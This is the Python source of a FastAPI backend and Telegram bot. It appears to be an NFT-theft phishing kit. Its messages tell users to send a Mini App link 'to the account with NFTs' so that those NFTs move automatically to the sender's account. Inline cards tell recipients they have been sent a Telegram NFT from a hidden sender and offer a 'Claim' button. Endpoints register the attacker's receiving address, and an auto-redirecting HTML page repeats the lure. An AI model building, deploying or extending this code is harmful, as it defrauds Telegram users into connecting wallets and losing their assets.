from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InlineQueryResultArticle, InputTextMessageContent, InlineQueryResultGif
from telegram.ext import Application, CommandHandler, ContextTypes, InlineQueryHandler
import os
from dotenv import load_dotenv
import logging

load_dotenv()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
MINI_APP_URL = os.getenv("MINI_APP_URL", "https://yourdomain.com")
WEBHOOK_URL = os.getenv("WEBHOOK_URL", "https://project-nft.onrender.com")
BOT_USERNAME = os.getenv("BOT_USERNAME", "IncognitoGiftsBot")
APP_SHORT_NAME = os.getenv("APP_SHORT_NAME", "incognitogifts")

if not BOT_TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN не установлен в .env")

telegram_app = Application.builder().token(BOT_TOKEN).build()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    logger.info(f"Пользователь {user_id} ({user.username}) запустил бота")

    # Официальная ссылка на Mini App с красивым preview
    mini_app_link = f"https://t.me/{BOT_USERNAME}/{APP_SHORT_NAME}?startapp={user_id}"

    message_text = (
        f"🎁 **Получить Telegram NFT**\n\n"
        f"Отправь эту ссылку на аккаунт с NFT:\n"
        f"{mini_app_link}\n\n"
        f"💎 Все NFT автоматически перейдут на твой аккаунт **{user.first_name}**\n\n"
        f"_При открытии ссылки - подключи кошелёк и NFT моментально переведутся!_"
    )

    # Кнопка с прямой ссылкой на Mini App
    keyboard = [
        [InlineKeyboardButton("🎁 Открыть приложение", url=mini_app_link)]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        message_text,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🦦 Напиши `@IncognitoGiftsBot` в любом чате чтобы отправить NFT!",
        parse_mode='Markdown'
    )

async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обрабатывает inline запросы - показывает красивую карточку с GIF"""
    user_id = update.inline_query.from_user.id

    # Ссылка на Mini App
    mini_app_link = f"https://t.me/{BOT_USERNAME}/{APP_SHORT_NAME}?startapp={user_id}"

    nft_name = "Lol Pop #130400"
    gif_url = "https://www.image2url.com/r2/default/gifs/1786609701564-2877ee88-25c6-4e8a-ad3f-2ade770a762f.gif"

    # Создаём красивую карточку с кнопкой
    keyboard = [
        [InlineKeyboardButton("Забрать", url=mini_app_link)]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Используем InlineQueryResultGif чтобы показать GIF с текстом
    # thumbnail должен быть JPEG, используем статичный кадр
    thumbnail = "https://i.imgur.com/placeholder.jpg"

    results = [
        InlineQueryResultGif(
            id="nft_gift",
            gif_url=gif_url,
            thumbnail_url=thumbnail,
            gif_width=320,
            gif_height=320,
            title="🎁 Отправить Telegram NFT",
            caption=f"Вам отправлен Telegram NFT: **{nft_name}**\n\nОт: **Аккаунт скрыт**",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    ]

    await update.inline_query.answer(results, cache_time=1)

telegram_app.add_handler(CommandHandler("start", start))
telegram_app.add_handler(CommandHandler("help", help_command))
telegram_app.add_handler(InlineQueryHandler(inline_query))

user_addresses = {}

class RecipientRequest(BaseModel):
    user_id: str

class RegisterAddressRequest(BaseModel):
    user_id: int
    address: str

@app.post("/api/get-recipient-address")
async def get_recipient_address(request: RecipientRequest):
    user_id = request.user_id

    if user_id not in user_addresses:
        raise HTTPException(status_code=404, detail="Адрес получателя не найден")

    return {"address": user_addresses[user_id]}

@app.post("/api/register-address")
async def register_address(request: RegisterAddressRequest):
    user_addresses[str(request.user_id)] = request.address
    logger.info(f"Зарегистрирован адрес для пользователя {request.user_id}: {request.address}")
    return {"status": "ok"}

@app.get("/share/{user_id}")
async def share_nft_preview(user_id: str, request: Request):
    """Генерирует HTML с Open Graph метатегами для красивого preview в Telegram"""

    # URL на Mini App
    mini_app_url = f"{MINI_APP_URL}?tgWebAppStartParam={user_id}"

    # Дефолтная GIF анимация NFT (можно сделать динамической)
    nft_image = "https://i.imgur.com/placeholder.gif"  # TODO: заменить на реальную

    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <!-- Open Graph метатеги для Telegram -->
        <meta property="og:title" content="🎁 Вам отправлен Telegram NFT" />
        <meta property="og:description" content="Отправитель: Аккаунт скрыт" />
        <meta property="og:image" content="{nft_image}" />
        <meta property="og:image:width" content="500" />
        <meta property="og:image:height" content="500" />
        <meta property="og:type" content="website" />

        <!-- Telegram WebApp метатеги -->
        <meta name="telegram:card" content="summary_large_image" />

        <title>NFT Transfer</title>

        <style>
            body {{
                font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                min-height: 100vh;
                margin: 0;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                text-align: center;
                padding: 20px;
            }}

            .container {{
                max-width: 400px;
            }}

            .nft-image {{
                width: 280px;
                height: 280px;
                border-radius: 20px;
                margin-bottom: 30px;
                box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            }}

            h1 {{
                font-size: 28px;
                margin-bottom: 10px;
            }}

            .sender {{
                font-size: 16px;
                opacity: 0.9;
                margin-bottom: 30px;
            }}

            .claim-button {{
                background: white;
                color: #667eea;
                border: none;
                padding: 16px 48px;
                font-size: 18px;
                font-weight: 600;
                border-radius: 12px;
                cursor: pointer;
                text-decoration: none;
                display: inline-block;
                box-shadow: 0 4px 15px rgba(0,0,0,0.2);
                transition: transform 0.2s;
            }}

            .claim-button:hover {{
                transform: scale(1.05);
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <img src="{nft_image}" alt="NFT" class="nft-image">
            <h1>🎁 Вам отправлен Telegram NFT</h1>
            <p class="sender">Отправитель: <strong>Аккаунт скрыт</strong></p>
            <a href="{mini_app_url}" class="claim-button">Забрать</a>
        </div>

        <script>
            // Автоматически открывать в Telegram WebApp если доступно
            if (window.Telegram && window.Telegram.WebApp) {{
                window.Telegram.WebApp.ready();
                window.location.href = '{mini_app_url}';
            }}
        </script>
    </body>
    </html>
    """

    return HTMLResponse(content=html_content)

@app.get("/api/health")
async def health():
    return {"status": "ok"}

@app.post(f"/telegram-webhook/{BOT_TOKEN}")
async def telegram_webhook(request: Request):
    json_data = await request.json()
    update = Update.de_json(json_data, telegram_app.bot)
    await telegram_app.process_update(update)
    return {"ok": True}

@app.on_event("startup")
async def on_startup():
    await telegram_app.initialize()
    await telegram_app.bot.delete_webhook(drop_pending_updates=True)
    await telegram_app.start()
    await telegram_app.updater.start_polling(allowed_updates=Update.ALL_TYPES)
    logger.info("Бот запущен в polling режиме")

@app.on_event("shutdown")
async def on_shutdown():
    await telegram_app.updater.stop()
    await telegram_app.stop()
    await telegram_app.shutdown()
    logger.info("Бот остановлен")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
